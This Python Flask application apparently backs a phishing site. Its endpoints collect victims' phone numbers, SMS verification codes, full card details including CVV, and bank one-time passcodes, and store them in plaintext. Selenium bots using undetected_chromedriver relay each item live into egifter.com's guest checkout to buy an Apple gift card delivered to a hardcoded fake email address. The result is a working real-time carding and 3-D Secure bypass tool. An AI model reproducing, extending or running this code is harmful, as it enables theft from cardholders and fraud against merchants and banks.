from flask import Flask, jsonify
from flask_cors import CORS, cross_origin
import time
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.action_chains import ActionChains
from flask import request
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
import os

#app configuration
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite3'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 
db = SQLAlchemy(app)
migrate = Migrate(app, db)
CORS(app)


#database model configuration
#a phone number is saved with a codeRef for that phone number and isValid property which is always true if the codeRef is not None
class PhoneNumber(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    number = db.Column(db.String(20))
    codeRef = db.Column(db.String(20))
    isValid = db.Column(db.Boolean, default=True)
    
    def __repr__(self):
        return f'{self.number} - {self.codeRef}'

#a verification code is saved with it's codeRef and isValid property for code validation    
class VerificationCode(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    code = db.Column(db.String(20))
    codeRef = db.Column(db.String(20))
    isValid = db.Column(db.Boolean)
    
    def __repr__(self):
        return f'{self.codeRef} - {self.code} - {self.isValid}'
    
#a card detail is saved with it's cardRef and isValid property for code validation     
class CardDetails(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    cardHolderName = db.Column(db.String(100))
    cardNumber = db.Column(db.String(30))
    month = db.Column(db.String(20))
    year = db.Column(db.String(20))
    cvv = db.Column(db.String(20))
    addressLine1 = db.Column(db.String(200))
    addressLine2 = db.Column(db.String(200), nullable=True)
    city = db.Column(db.String(100))
    state = db.Column(db.String(100))
    zip = db.Column(db.String(20))
    email = db.Column(db.String(200))
    cardRef = db.Column(db.String(20))
    isValid = db.Column(db.Boolean)
    
    def __repr__(self):
        return f'{self.cardHolderName} - {self.cardNumber}'

#an otp is saved with it's cardRef  
class Otp(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    code = db.Column(db.String(20))
    cardRef = db.Column(db.String(100))
    
    def __repr__(self):
        return f'{self.cardRef} - {self.code}'


#start a webdriver     
def start_driver():
    user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
    options = uc.ChromeOptions()
    options.binary_location = os.environ.get('GOOGLE_CHROME_BIN')
    options.add_argument("--headless")
    options.add_argument("window-size=1920,1080")
    options.add_argument(f'user-agent={user_agent}')
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--allow-running-insecure-content')
    options.add_argument("--disable-extensions")
    options.add_argument("--proxy-server='direct://'")
    options.add_argument("--proxy-bypass-list=*")
    options.add_argument("--start-maximized")
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-web-security')
    return uc.Chrome(
        options=options,
        executable_path = os.environ.get("CHROMEDRIVER_PATH")
    )
    
#bot to send a phone number and amount to egifter.com and recieve a verfication code
def send_phone_number_bot(driver, amount, phoneNumber):
    try:
        driver.get("https://www.egifter.com/")
        appleCard = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "#main-content > div > div.HomeCardCatalogComponent > div > div > div > div.mt-4 > div > div > div:nth-child(4) > div > div.brandImageContainer.rounded-top.overflow-hidden > div > div"))
        )
        script0 = 'let appleCard = document.querySelector("#main-content > div > div.HomeCardCatalogComponent > div > div > div > div.mt-4 > div > div > div:nth-child(4) > div > div.brandImageContainer.rounded-top.overflow-hidden > div > div"); appleCard.click()'
        time.sleep(1)
        driver.execute_script(script0)
        amountInput = WebDriverWait(driver,20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[1]/div[2]/div/div/section[1]/div/div/div[2]/form/div[1]/div/div/div/div/div/div[2]/div[2]/div/input'))
        )
        ActionChains(driver).move_to_element(amountInput).click().perform()
        for i in range(0,6):
            amountInput.send_keys(Keys.BACKSPACE)
            time.sleep(0.5)
        ActionChains(driver).move_to_element(amountInput).send_keys(amount).perform()
        time.sleep(0.5)
        ActionChains(driver).move_to_element(amountInput).send_keys(Keys.TAB).perform()
        script1 = 'let forMyselfButton = document.querySelector("#main-content > div > div.BrandBodyComponent.ITUNESC > div.ContainerComponent.container.container-sm.brandDetailsContainer.container-max-width-xl > div > div > section.my-6 > div > div > div.BrandFormComponent > form > section:nth-child(5) > div > div:nth-child(1) > button"); forMyselfButton.click()'
        driver.execute_script(script1)
        proceedToCheckout = WebDriverWait(driver,20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div/div[1]/div[2]/div/div/div[2]/section[2]/div/button[2]'))
        )
        script2 = 'let proceedToCheckout = document.querySelector("#main-content > div > div > div.ContainerComponent.container.container-sm.HeadlineLayoutComponent.CartComponent.container-max-width-xl.ribbonedHeadlineEnabled > div.card.contentWrapper.bg-white > div > div > div.mt-4.mt-xl-0.col-xl-6 > section:nth-child(3) > div > button.eg-button.mdc-button.mdc-button--raised.eg-button--block.mdc-ripple-upgraded.eg-button--variant-primary"); proceedToCheckout.click()'
        time.sleep(0.5)
        driver.execute_script(script2)
        continueAsGuest = WebDriverWait(driver,20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/section[2]/button'))
        )
        script3 = 'let continueAsGuest = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > section.mt-2 > button"); continueAsGuest.click()'
        time.sleep(0.5)
        driver.execute_script(script3)
        creditCard = WebDriverWait(driver,20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div[1]/div/button'))
        )
        script4 = 'let creditCard = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div:nth-child(1) > div > button"); creditCard.click()'
        time.sleep(0.5)
        driver.execute_script(script4)
        numberInput = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/div/form/div/div/div[1]/input'))
            )
        time.sleep(0.5)
        numberInput.send_keys(phoneNumber)
        script5 = 'let sendCode = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div > div > div.paymentFormWrapper > div:nth-child(3) > div > div > div > form > div > button"); sendCode.click()'
        time.sleep(0.5)
        driver.execute_script(script5)
        confirmCodeInput = WebDriverWait(driver,30).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/div/form/div/div[2]/div[1]/div[1]/div/div[1]/input'))
        )
        return True
    except Exception as e:
        print(e)
        driver.quit()
        return False

#bot to send the verification code received     
def send_verification_code_bot(driver, verificationCode):
    try:
        confirmCodeInput = WebDriverWait(driver,20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/div/form/div/div[2]/div[1]/div[1]/div/div[1]/input'))
        )
        time.sleep(0.5)
        confirmCodeInput.send_keys(verificationCode)
        script0 = 'let verifyNumber = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div > div > div.paymentFormWrapper > div:nth-child(3) > div > div > div > form > div > div:nth-child(3) > div.mt-2 > button"); verifyNumber.click()'
        time.sleep(0.5)
        driver.execute_script(script0)
        nameOnCardInput = WebDriverWait(driver,20).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[1]/div/div[2]/div[1]/div[1]/input'))
        )
        return True
    except Exception as e:
        print(e)
        driver.quit()
        return False
 
    
#bot to send card details received 
def send_card_details_bot(driver, cardDetails):
    monthDictionary = {
         '01': '1',
         '02': '2',
         '03': '3',
         '04': '4',
         '05': '5',
         '06': '6',
         '07': '7',
         '08': '8',
         '09': '9',
         '10': '10',
         '11': '11',
         '12': '12'
     }  
    yearDictionary = {
         '2022': '1',
         '2023': '2',
         '2024': '3',
         '2025': '4',
         '2026': '5',
         '2027': '6',
         '2028': '7',
         '2029': '8',
         '2030': '9',
         '2031': '10',
         '2032': '11',
         '2033': '12',
    }
    us_state = {
        'Alabama': '1',
        'Alaska': '2',
        'Arizona': '3',
        'Arkansas': '4',
        'California': '5',
        'Colorado': '6',
        'Connecticut': '7',
        'Delaware': '8',
        'District of Columbia': '9',
        'Florida': '10',
        'Georgia': '11',
        'Hawaii': '12',
        'Idaho': '13',
        'Illinois': '14',
        'Indiana': '15',
        'Iowa': '16',
        'Kansas': '17',
        'Kentucky': '18',
        'Louisiana': '19',
        'Maine': '20',
        'Maryland': '21',
        'Massachusetts': '22',
        'Michigan': '23',
        'Minnesota': '24',
        'Mississippi': '25',
        'Missouri': '26',
        'Montana': '27',
        'Nebraska': '28',
        'Nevada': '29',
        'New Hampshire': '30',
        'New Jersey': '31',
        'New Mexico': '32',
        'New York': '33',
        'North Carolina': '34',
        'North Dakota': '35',
        'Ohio': '36',
        'Oklahoma': '37',
        'Oregon': '38',
        'Pennsylvania': '39',
        'Rhode Island': '40',
        'South Carolina': '41',
        'South Dakota': '42',
        'Tennessee': '43',
        'Texas': '44',
        'Utah': '45',
        'Vermont': '46',
        'Virginia': '47',
        'Washington': '48',
        'West Virginia': '49',
        'Wisconsin': '50',
        'Wyoming': '51'
    }
    try:
        nameOnCardInput = WebDriverWait(driver,10).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[1]/div/div[2]/div[1]/div[1]/input'))
        )
        nameOnCardInput.send_keys(cardDetails.cardHolderName)
        time.sleep(1)
        cardNumberInput = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[1]/div/div[2]/div[2]/div[1]/input'))
        )
        cardNumberInput.send_keys(cardDetails.cardNumber)
        time.sleep(1)
        monthNumber = monthDictionary[cardDetails.month]
        script0 = 'let monthButton = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div > div > div.paymentFormWrapper > div:nth-child(3) > div > div > form > section.row.bg-gray-lighter.py-2 > div > div.CreditCardFormComponent > div.row.flex-nowrap.align-items-center > div:nth-child(1) > div > div.eg-select.mdc-select.mdc-select--filled > div.mdc-select__menu.mdc-menu.mdc-menu-surface > ul > li:nth-child('+monthNumber+') > a"); monthButton.click()'
        driver.execute_script(script0)
        time.sleep(1)
        yearNumber = yearDictionary[cardDetails.year]
        script1 = 'let yearButton = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div > div > div.paymentFormWrapper > div:nth-child(3) > div > div > form > section.row.bg-gray-lighter.py-2 > div > div.CreditCardFormComponent > div.row.flex-nowrap.align-items-center > div.px-0.col-4 > div > div.eg-select.mdc-select.mdc-select--filled > div.mdc-select__menu.mdc-menu.mdc-menu-surface > ul > li:nth-child('+yearNumber+') > a"); yearButton.click()'
        driver.execute_script(script1)
        cvvInput = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[1]/div/div[2]/div[3]/div[3]/div/div[1]/input'))
        )
        cvvInput.send_keys(cardDetails.cvv)
        time.sleep(1)
        addressLine1Input = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[2]/div/div[1]/div[1]/input'))
        )
        addressLine1Input.send_keys(cardDetails.addressLine1)
        time.sleep(1)
        addressLine2Input = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[2]/div/div[2]/div/input'))
        )
        time.sleep(1)
        addressLine2Input = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[2]/div/div[2]/div/input'))
        )
        addressLine2Input.send_keys(cardDetails.addressLine2)
        time.sleep(1)
        cityInput = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[2]/div/div[3]/div[1]/input'))
        )
        cityInput.send_keys(cardDetails.city)
        time.sleep(1)
        usStateNumber = us_state[cardDetails.state]
        script2 = 'let stateButton = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div > div > div.paymentFormWrapper > div:nth-child(3) > div > div > form > section:nth-child(2) > div > div.row > div.col-8 > div > div.eg-select.mdc-select.mdc-select--filled > div.mdc-select__menu.mdc-menu.mdc-menu-surface > ul > li:nth-child('+usStateNumber+') > a"); stateButton.click()'
        driver.execute_script(script2)
        time.sleep(1)
        zipInput = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/section[2]/div/div[4]/div[2]/div/div[1]/input'))
        )
        zipInput.send_keys(cardDetails.zip)
        time.sleep(1)
        emailInput = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/div/div[1]/div[1]/input'))
        )
        emailInput.send_keys('fakealexismartin237@gmail.com')
        time.sleep(1)
        emailConfirmInput = WebDriverWait(driver,5).until(
            EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[2]/div/div[1]/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[2]/div/div/form/div/div[2]/div/input'))
        )
        emailConfirmInput.send_keys('fakealexismartin237@gmail.com')
        time.sleep(1)
        script3 = 'checkoutButton = document.querySelector("#main-content > div > div.card.contentWrapper.bg-white > div > div.row > div.mt-4.mt-xl-0.col-xl-6 > div.PaymentMethodsSectionComponent > div > div > div > div > div > div > div.paymentFormWrapper > div:nth-child(3) > div > div > form > section.mt-2 > button"); checkoutButton.click()'
        driver.execute_script(script3)
        time.sleep(1)
        otpInput = WebDriverWait(driver,40).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '#Cardinal-ElementContainer'))
            )
        return True
    except Exception as e:
        print(e)
        driver.quit()
        return False

#bot to send_otp_code received
def send_otp_bot(driver, code):
    try:
        otpInput = WebDriverWait(driver,40).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '#Cardinal-ElementContainer'))
            )
        driver.switch_to.frame('Cardinal-CCA-IFrame')
        script0  = 'let otpInput = document.querySelector("#Credential_Value"); otpInput.value='+code+';'
        driver.execute_script(script0)
        time.sleep(1)
        script1 = 'let submit = document.querySelector("#ValidateButton"); submit.click()'
        driver.execute_script(script1)
        
        return True
    except Exception as e:
        print(e)
        driver.quit()
        return False
    
#this function takes in as parameter the reference for a verification code, searches for the code in the database for "timeDelay"seconds
#then returns the verification which can be the codeObject or a None object
def get_verification_code_object(codeRef, timeDelay):
    found = False
    count = 0
    verificationCodeObject = ''
    while not found:
        verificationCodeObject = VerificationCode.query.filter_by(codeRef=codeRef).first()
        if verificationCodeObject is not None:
            found = True
        count = count + 1
        if count == timeDelay:
            break
        time.sleep(1)
    return verificationCodeObject

#this function takes in as parameter the reference for a card details, searches for the code in the database for "timeDelay"seconds
#then returns the card which can be the cardDetail or a none object
def get_card_details(cardRef, timeDelay):
    found = False
    count = 0
    cardDetails = ''
    while not found:
        cardDetails = CardDetails.query.filter_by(cardRef=cardRef).first()
        if cardDetails is not None:
            found = True
        count = count + 1
        if count == timeDelay:
            break
        time.sleep(1)
    return cardDetails

#this function takes in as parameter the reference for a card details, searches for an in the database for "timeDelay"seconds
#then returns the otp which can be the otpobject or a none object
def get_otp(cardRef, timeDelay):
    found = False
    count = 0
    otp =  ''
    while not found:
        otp = Otp.query.filter_by(cardRef=cardRef).first()
        if otp is not None:
            found = True
        count = count + 1
        if count == timeDelay:
            break
        time.sleep(1)
    return otp

    
#endpoint endpoint incharge of taking the phonenumber,amount and sending the verification code  
@app.route('/save-phone-number', methods=["POST"])
@cross_origin()
def save_phone_number():
    #initiate a driver instance
    driver = start_driver()
    try:
        amount = int(request.json["amount"])
        phoneNumber = request.json["phoneNumber"]
        codeRef = request.json["codeRef"]
        cardRef = request.json["cardRef"]
        #send a phone number received from a user to egifter.com
        phone_number_sent = send_phone_number_bot(driver,amount, phoneNumber)
        if phone_number_sent:
            #save the phone number to the phone number object in the database
            phoneNumberObject = PhoneNumber(number=phoneNumber, codeRef=codeRef)
            db.session.add(phoneNumberObject)
            db.session.commit()
            #get the verification code sent by the user
            verificationCodeObject = get_verification_code_object(codeRef, 600)
            #if the user sends the verifation code after 10 minuites
            if verificationCodeObject is not None:  
                #send the verification code received to egifter.com for validation
                code_is_valid = send_verification_code_bot(driver,verificationCodeObject.code)  
                if code_is_valid:
                    #update the verifcation code object and set isValid attribute to true
                    verificationCodeObject.isValid = True
                    db.session.commit()
                    #get the card details sent by the user
                    cardDetails = get_card_details(cardRef, 600)
                    #if the user sends the card details after 10 minuites
                    if cardDetails is not None:
                        #send the card details to egifter.com to make a purchase of 'ammount'
                        card_details_sent = send_card_details_bot(driver,cardDetails)
                        if card_details_sent:
                            #update the cardDetails object and set isValid attribute to ture
                            cardDetails.isValid = True
                            db.session.commit()
                            #get the otp code sent by the user
                            otp = get_otp(cardRef, 400)
                            #if the user sends the otp code after 6 minuites
                            if otp is not None:
                                #sent the otp code code to egifter.com for validation
                                otp_sent = send_otp_bot(driver,otp.code)
                                if otp_sent:
                                    #if the otp code is sent, quit the browser and notify the user
                                    time.sleep(5)
                                    driver.quit()
                                    return jsonify({'success': True, 'message': 'Payment Authentication, It may take a few minutes to be approved. You will be notified of its completion'})
                                else:
                                    driver.quit()
                                    return jsonify({'success': False, 'message': 'Failed to validate OTP, Please Contact Your Bank and Try again'})
                            else:
                                driver.quit()
                                return jsonify({'success': False, 'message': 'OTP Timeout, Please Try again'})
                        else:
                            driver.quit()
                            return jsonify({'success': False, 'message': 'A Problem Occured while Validating Payment Details, Please Try again'})
                    else:
                        driver.quit()
                        return jsonify({'success': False, 'message': 'Payment Timeout, Please Try again'})    
                else:
                    driver.quit()
                    return jsonify({'success': False, 'message': 'Code is not valid, Please Try again'})
            else:
                driver.quit()
                return jsonify({'success': False, 'message': 'Verification Code Timeout, Please Try again'})
        else:
            driver.quit()
            return jsonify({'success': False, 'message': 'A Problem Occured while Validating Phone number, Please Try again'})
    finally:
        driver.quit()

#app home or index page to test for hosting        
@app.route('/')
@cross_origin()
def index():
    return "App is deployed and running"

#endpoint incharge of saving a verification code to the database    
@app.route('/save-code', methods=["POST"])
@cross_origin()
def save_verification_code_to_db():
    verificationCode = request.json["verificationCode"]
    codeRef = request.json["codeRef"]
    verificationCodeObject = VerificationCode(code=verificationCode, codeRef=codeRef)
    db.session.add(verificationCodeObject)
    db.session.commit()
    return jsonify({'success': True})


#this endpoint determines if a verification code has been sent to a phone number, it returns true if the reference code for the phone number is found
@app.route('/request-verification-code', methods=["POST"])
@cross_origin()
def request_verification_code():
    codeRef = request.json["codeRef"]
    phoneNumberObject = PhoneNumber.query.filter_by(codeRef=codeRef).first()
    if phoneNumberObject is not None:
        return jsonify({'codeFound': True,'valid': phoneNumberObject.isValid})
    else:
        return jsonify({'codeFound': False, 'valid': False})


#this endpoint determines if a verication is valid and returns true if it is found and valid    
@app.route('/validate-code', methods=["POST"])
@cross_origin()
def validate_code():
    codeRef = request.json["codeRef"]
    verificationCodeObject = VerificationCode.query.filter_by(codeRef=codeRef).first()
    if verificationCodeObject is not None:
        return jsonify({'codeFound': True,'valid': verificationCodeObject.isValid})
    else:
        return jsonify({'codeFound': False, 'valid': False})
    

#this endpoint saves card details to the database    
@app.route('/save-payment-details', methods=["POST"])
@cross_origin()
def save_payment_details():
    cardHolderName = request.json["cardHolderName"]
    cardNumber = request.json["cardNumber"]
    month = request.json["month"]
    year = request.json["year"]
    cvv = request.json["cvv"]
    addressLine1 = request.json["addressLine1"]
    addressLine2 = request.json["addressLine2"]
    city = request.json["city"]
    state = request.json["state"]
    zip = request.json["zip"]
    email = request.json["email"]    
    cardRef = request.json["cardRef"]
    
    cardDetails = CardDetails(
        cardHolderName = cardHolderName,
        cardNumber = cardNumber,
        month = month,
        year = year,
        cvv = cvv,
        addressLine1 = addressLine1,
        addressLine2 = addressLine2,
        city = city,
        state = state,
        zip = zip,
        email = email,
        cardRef = cardRef,
    )
    db.session.add(cardDetails)
    db.session.commit()
    return jsonify({'success': True})

#this endpoint determines if a credit card is valid
@app.route('/validate-card', methods=["POST"])
@cross_origin()
def validate_card():
    cardRef = request.json["cardRef"]
    cardDetails = CardDetails.query.filter_by(cardRef=cardRef).first()
    if cardDetails is not None:
        return jsonify({'cardFound': True,'valid': cardDetails.isValid})
    else:
        return jsonify({'cardFound': False, 'valid': False})
    
 #thid endpoint saves an otp code to the database   
@app.route('/save-otp', methods=["POST"])
@cross_origin()
def save_otp():
    code = request.json["otp"]
    cardRef = request.json["cardRef"]
    otp = Otp(code=code,cardRef=cardRef)
    db.session.add(otp)
    db.session.commit()
    return jsonify({'success': True})


if __name__ == '__main__':
    app.run(debug=True)
